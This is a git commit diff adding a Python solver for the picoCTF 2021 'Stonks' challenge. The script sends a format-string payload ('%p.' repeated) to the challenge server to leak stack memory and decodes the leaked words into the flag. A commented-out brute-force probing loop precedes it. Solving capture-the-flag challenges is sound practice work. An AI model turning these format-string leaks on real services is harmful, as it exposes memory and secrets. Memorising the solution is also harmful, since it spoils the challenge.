62404b27ae8586fc991716a81baa4ad820d16838
greytabby <munchkin.coco@gmail.com>
2021-04-19 22:25:52 +0900

    Add Stonks solver

--- picoCTF2021/Stonks/solve.py
+++ picoCTF2021/Stonks/solve.py
@@ -1,26 +1,37 @@
 from ptrlib import *
 import time
+import binascii
 
-for i in range(300):
-    sock = Socket('mercury.picoctf.net', 53437)
-    sock.recvuntil('Welcome back to the trading app!\n\nWhat would you like to do?\n1) Buy some stonks!\n2) View my portfolio\n')
-    sock.sendline('1')
-    sock.recvuntil('Using patented AI algorithms to buy stonks\nStonks chosen\nWhat is your API token?\n')
-    sock.sendline('%{}$p'.format(i))
-    sock.recvuntil('Buying stonks with token:')
-    resp = sock.recv(128)
-    print(i, resp)
-    if b'pico' in resp:
-        break
-        print(resp)
-    if b'api' in resp:
-        break
-        print(resp)
+# for i in range(300):
+#     sock = Socket('mercury.picoctf.net', 53437)
+#     sock.recvuntil('Welcome back to the trading app!\n\nWhat would you like to do?\n1) Buy some stonks!\n2) View my portfolio\n')
+#     sock.sendline('1')
+#     sock.recvuntil('Using patented AI algorithms to buy stonks\nStonks chosen\nWhat is your API token?\n')
+#     sock.sendline('%{}$c'.format(i))
+#     sock.recvuntil('Buying stonks with token:')
+#     resp = sock.recv(128)
+#     print(i, resp)
+#     if b'pico' in resp:
+#         break
+#         print(resp)
+#     if b'api' in resp:
+#         break
+#         print(resp)
 
-# sock = Socket('mercury.picoctf.net', 53437)
-# sock.recvuntil('Welcome back to the trading app!\n\nWhat would you like to do?\n1) Buy some stonks!\n2) View my portfolio\n')
-# sock.sendline('1')
-# sock.recvuntil('Using patented AI algorithms to buy stonks\nStonks chosen\nWhat is your API token?\n')
-# sock.sendline('%{}$s'.format('%p'*150))
-# resp = sock.recv(2048)
-# print(resp)
+sock = Socket('mercury.picoctf.net', 53437)
+sock.recvuntil('Welcome back to the trading app!\n\nWhat would you like to do?\n1) Buy some stonks!\n2) View my portfolio\n')
+sock.sendline('1')
+sock.recvuntil('Using patented AI algorithms to buy stonks\nStonks chosen\nWhat is your API token?\n')
+sock.sendline(b'%p.'*90)
+resp = sock.recv()
+a = resp.decode()
+
+flag = b''
+for v in a.split('.'):
+    if not v.startswith("0x"):
+        continue
+    if len(v) != 10:
+        continue
+    flag += binascii.unhexlify(v[2:])[::-1]
+
+print(flag)
